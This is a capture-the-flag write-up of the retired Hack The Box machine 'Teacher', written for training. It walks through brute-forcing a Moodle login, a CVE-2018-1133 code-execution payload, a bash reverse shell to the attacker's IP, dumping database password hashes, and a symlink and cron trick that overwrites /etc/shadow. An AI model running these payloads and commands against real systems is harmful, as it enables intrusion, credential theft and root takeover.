# Teacher

This is the write-up for the box Teacher that got retired at the 20th April 2019.
My IP address was 10.10.14.2 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.153    teacher.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/teacher.nmap 10.10.10.153
```

```markdown
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Blackhat highschool
```

## Checking HTTP (Port 80)

The web page is a website of a fictional school _"Blackhat Highschool"_ with some links that don't work forward anywhere and stock text.
In the HTML source code of _/gallery.html_ is one suspicious line:
```html
<li><a href="#"><img src="images/5.png" onerror="console.log('That\'s an F');" alt=""></a></li>
```

When clicking on _/images/5.png_ it shows an error:
```markdown
The image "http://10.10.10.153/images/5.png" cannot be displayed because it contains errors.
```

Downloading it with `wget` and looking what kind of file type this is:
```markdown
file 5.png
5.png: ASCII text
```

It is a text file that can be read:
```markdown
Hi Servicedesk,

I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.

Could you guys figure out what the last charachter is, or just reset it?

Thanks,
Giovanni
```

Lets search for hidden directories with **Gobuster** to see where these credentials could be used:
```markdown
gobuster -u http://10.10.10.153 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

If finds the directory _/moodle_ that forwards to a [Moodle platform](https://moodle.org/) which is an Open-Source _Learning Management System (LMS)_ written in PHP.

All links forward to the login page _/moodle/login/index.php_ as our access is restricted.
By sending this to a proxy tool like **Burpsuite** we can see the request parameters and fuzz for the last character of the password with **Wfuzz**:
```markdown
wfuzz -u http://10.10.10.153/moodle/login/index.php -d 'anchor=&username=Giovanni&password=Th4C00lTheachaFUZZ' -w /usr/share/seclists/Fuzzing/special-chars.txt
```

The _number sign (#)_ responds with a different character length, so this is probably the last character of the password.
Login with the username _Giovanni_ and the password _Th4C00lTheacha#_ works.

### Exploiting Moodle

To exploit **Moodle**, the installed version number has to be found.
This can be done by clicking on _"Moodle Docs for this page"_ in the footer of the page, which forwards to the [Moodle documentation for version 3.4](https://docs.moodle.org/34/en/Participants) that was [released in November 2017](https://docs.moodle.org/dev/Moodle_3.4_release_notes).

After searching for vulnerabilities for this version, a blog post from the [RIPS TECH Blog](https://blog.ripstech.com/2018/moodle-remote-code-execution/) explains a Remote Code Execution with the name **Evil Teacher** or **CVE-2018-1133**.

Lets follow the steps of RIPS TECH explanation to exploit this vulnerability.

Creating a quiz:
```markdown
Site home --> Algebra --> Gear symbol on the top right --> Turn editing on
```
```markdown
Add an activity or resource --> Quiz --> Add
```

Giving it a name, changing nothing else in the configuration and saving it by clicking on _"Save and display"_.

![Creating a quiz](https://kyuu-ji.github.io/htb-write-up/teacher/teacher_web-1.png)

Creating question for the quiz:
```markdown
Edit quiz --> Add --> a new question --> Calculated
```

![Creating question](https://kyuu-ji.github.io/htb-write-up/teacher/teacher_web-2.png)

```markdown
Question name: Test question name

Question text: Is this a question?

Answer 1 formula = /\*{a\*/\`$_REQUEST[cmd]\`;//{x}}
```

![Payload in answer formula](https://kyuu-ji.github.io/htb-write-up/teacher/teacher_web-3.png)

```markdown
Save changes --> Do no synchronise --> Next page
```

The current page can be sent to **Burpsuite** to test code execution:
```markdown
GET /moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7&cmd=ping+-c+1+10.10.14.2
```

The test command will ping my IP once, so lets listen on incoming ICMP traffic with `tcpdump`:
```markdown
tcpdump -i tun0 -n icmp
```

After sending the request, the ping packet reaches my client and proofs command execution.
Lets execute a reverse shell command:
```markdown
GET /moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.2/9001+0>%261'

# Command URL-decoded:
bash -c 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1'
```

After sending the request, the listener on my IP and port 9001 starts a reverse shell as _www-data_.

## Privilege Escalation

In the directory _/var/www/html/moodle_ are the configuration files. In _config.php_ are credentials to the **MySQL database**:
```markdown
(...)
dbname = 'moodle';
dbuser = 'root';
dbpass = 'Welkom1!';
(...)
```

Connecting to the database:
```markdown
mysql -u root -D moodle -p
```
```markdown
MariaDB [moodle]> show databases;

MariaDB [moodle]> select id, username, password from mdl_user;
```
```markdown
+------+-------------+--------------------------------------------------------------+
| id   | username    | password                                                     |
+------+-------------+--------------------------------------------------------------+
|    1 | guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
|    2 | admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
|    3 | giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
| 1337 | Giovannibak | 7a860966115182402ed06375cf0a22af                             |
+------+-------------+--------------------------------------------------------------+
```

There are password hashes found and the password hash of _Giovannibak_ is different than the others as it is 32 characters long and thus probably a **MD5 hash**.

When searching for the MD5 hash on **Hashes.org** it is found and decodes to:
> expelled

Switching user to _giovanni_:
```markdown
su - giovanni
```

The password works and we get logged in as _giovanni_.

### Privilege Escalation to root

In the home directory _/home/giovanni_ is a folder called _/work_ and in there are files that according to their date, changed something today.
This could be a hint that an automated **cronjob** is doing this.

Running processes of all users can be enumerated with [pspy](https://github.com/DominicBreuker/pspy):
```markdown
wget 10.10.14.2/pspy32

./pspy32
```

After waiting for a while **pspy** detects the commands that are running:
```markdown
/bin/sh -c /usr/bin/backup.sh
```

Contents of _/usr/bin/backup.sh_:
```markdown
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
```

The script compresses some files and after decompressing them, changes the permissions so everyone can read, write and execute them.
By creating a **symlink** from _/home/giovanni/work/tmp_ to _/etc/shadow_, the permissions of the **Shadow file** can be changed:
```markdown
rm -rf ./tmp

ln -s /etc/shadow /home/giovanni/work/tmp
```

Changing password of root to password of _giovanni_:
```markdown
echo 'root:$6$RiDoH4VN$WamVNCkuoZyN1uM6hmyKKt6GwGWAamiQM3SYCrr5lmUYnmV7vpBNkYZCHqjh7UDtsdF8NbGjM7dJPIsxeFkrx0:17709:0:99999:7:::' >> /etc/shadow
```

With the password _"expelled"_ it is now possible to change users to root!
```markdown
su - root
```
